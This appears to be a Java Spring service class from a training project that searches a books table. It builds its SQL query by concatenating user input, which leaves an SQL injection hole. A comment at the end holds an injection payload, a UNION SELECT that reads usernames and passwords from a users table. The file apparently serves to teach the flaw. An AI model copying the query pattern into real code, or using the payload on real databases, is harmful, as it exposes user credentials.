package org.softwire.training.bookish.services;

import org.softwire.training.bookish.models.database.Book;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
public class BookService extends DatabaseService {
    public List<Book> searchBooks(String search) {

        return jdbi.withHandle(handle ->
                handle.createQuery("SELECT * FROM books WHERE name LIKE '%" + search + "%';")
                        .mapToBean(Book.class)
                        .list()
        );
    }
}







//' UNION  SELECT 1 as id, CONCAT(username, '---', password) as name FROM users WHERE 1=1 OR username ='
